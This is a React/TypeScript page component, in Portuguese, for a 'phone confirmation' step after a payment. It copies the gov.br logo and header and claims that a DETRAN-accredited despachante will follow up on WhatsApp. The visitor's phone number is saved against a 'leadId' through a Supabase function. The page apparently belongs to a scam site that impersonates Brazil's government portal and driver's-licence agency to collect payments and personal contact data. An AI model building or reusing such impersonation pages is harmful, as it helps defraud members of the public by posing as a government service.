import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '../integrations/supabase/client';
import { User, Phone, Loader2, CheckCircle, AlertTriangle, MessageCircle } from 'lucide-react';

const PhoneConfirmationHeader: React.FC<{ userName?: string }> = ({ userName }) => (
    <header className="bg-white border-b border-gray-200">
        <div className="max-w-4xl mx-auto px-4">
            <div className="py-3 flex items-center justify-between">
                <img src="/Gov.br_logo.svg.png" alt="gov.br" className="h-8 md:h-10" />
                <button className="flex items-center gap-2 bg-[#004381] text-white px-4 py-1.5 rounded-full text-sm font-medium hover:bg-blue-900 transition-colors">
                    <User size={18} />
                    <span>{userName || 'Entrar'}</span>
                </button>
            </div>
        </div>
    </header>
);

const PhoneConfirmationPage: React.FC = () => {
    const navigate = useNavigate();
    const [userData, setUserData] = useState<any>(null);
    const [phone, setPhone] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [isSuccess, setIsSuccess] = useState(false);
    const [error, setError] = useState<string | null>(null);

    useEffect(() => {
        const savedData = sessionStorage.getItem('cnh_userData');
        if (savedData) {
            const parsedData = JSON.parse(savedData);
            setUserData(parsedData);
            setPhone(parsedData.phone || '');
        } else {
            navigate('/login');
        }
    }, [navigate]);

    const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const value = e.target.value;
        const formattedPhone = value
            .replace(/\D/g, '')
            .replace(/^(\d{2})(\d)/g, '($1) $2')
            .replace(/(\d{5})(\d)/, '$1-$2');
        setPhone(formattedPhone.substring(0, 15));
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setIsLoading(true);
        setError(null);

        if (!userData?.leadId) {
            setError("Não foi possível encontrar os dados do seu cadastro. Por favor, tente novamente.");
            setIsLoading(false);
            return;
        }

        try {
            const { error: functionError } = await supabase.functions.invoke('update-lead-phone', {
                body: { leadId: userData.leadId, phone },
            });

            if (functionError) {
                throw new Error(functionError.message);
            }

            const updatedUserData = { ...userData, phone };
            sessionStorage.setItem('cnh_userData', JSON.stringify(updatedUserData));
            
            setIsSuccess(true);
            setTimeout(() => {
                navigate('/');
            }, 3000);

        } catch (err: any) {
            setError(err.message || "Ocorreu um erro ao atualizar seu telefone. Tente novamente.");
        } finally {
            setIsLoading(false);
        }
    };

    if (isSuccess) {
        return (
            <div className="bg-gray-50 min-h-screen">
                <PhoneConfirmationHeader userName={userData?.name?.split(' ')[0]} />
                <main className="max-w-xl mx-auto px-4 py-12">
                    <div className="bg-white p-8 rounded-lg shadow-md border border-gray-200 text-center">
                        <CheckCircle className="w-16 h-16 text-green-500 mx-auto mb-4" />
                        <h1 className="text-2xl font-bold text-gray-800 mb-2">Tudo Certo!</h1>
                        <p className="text-gray-600">Seu número foi confirmado com sucesso. Nosso despachante entrará em contato em breve. Você será redirecionado para a página inicial.</p>
                    </div>
                </main>
            </div>
        );
    }

    return (
        <div className="bg-gray-50 min-h-screen">
            <PhoneConfirmationHeader userName={userData?.name?.split(' ')[0]} />
            <main className="max-w-xl mx-auto px-4 py-12">
                <div className="bg-white p-8 rounded-lg shadow-md border border-gray-200">
                    <div className="text-center">
                        <CheckCircle className="w-12 h-12 text-green-500 mx-auto mb-4" />
                        <h1 className="text-2xl font-bold text-gray-800 mb-2">Pagamento Confirmado!</h1>
                        <p className="text-gray-600 mb-6">Agradecemos por sua inscrição! Um despachante credenciado pelo DETRAN entrará em contato com você via WhatsApp para finalizar o processo.</p>
                    </div>
                    
                    <div className="bg-blue-50 border border-blue-200 p-4 rounded-lg mb-8">
                        <div className="flex items-start gap-3">
                            <MessageCircle className="w-8 h-8 text-blue-600 flex-shrink-0 mt-1" />
                            <div>
                                <h3 className="font-bold text-gray-800">Confirme seu número de contato</h3>
                                <p className="text-gray-700 text-sm mt-1">Por favor, verifique se o número abaixo está correto. Este será o número utilizado para o contato do despachante.</p>
                            </div>
                        </div>
                    </div>
                    
                    <form onSubmit={handleSubmit} className="space-y-6">
                        <div>
                            <label htmlFor="phone" className="block text-sm font-bold text-gray-700 mb-1">Celular (com DDD)</label>
                             <div className="relative">
                                <Phone className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" size={20} />
                                <input 
                                    type="tel" 
                                    id="phone"
                                    placeholder="(00) 00000-0000"
                                    value={phone}
                                    onChange={handlePhoneChange}
                                    required
                                    className="w-full p-3 pl-10 border border-gray-400 rounded-lg focus:bg-yellow-100 focus:border-yellow-500 focus:ring-1 focus:ring-yellow-500 focus:outline-none text-lg"
                                    maxLength={15}
                                />
                            </div>
                        </div>

                        {error && (
                            <div className="bg-red-100 border-l-4 border-red-500 text-red-700 p-4 rounded-md flex items-center gap-3">
                                <AlertTriangle size={20} /> <p>{error}</p>
                            </div>
                        )}

                        <button 
                            type="submit"
                            className="w-full bg-[#0d6efd] text-white py-3 rounded-full font-bold text-lg hover:bg-blue-700 transition-colors disabled:bg-gray-400 flex items-center justify-center"
                            disabled={isLoading}
                        >
                            {isLoading ? <Loader2 className="animate-spin" /> : 'Confirmar e Finalizar'}
                        </button>
                    </form>
                </div>
            </main>
        </div>
    );
};

export default PhoneConfirmationPage;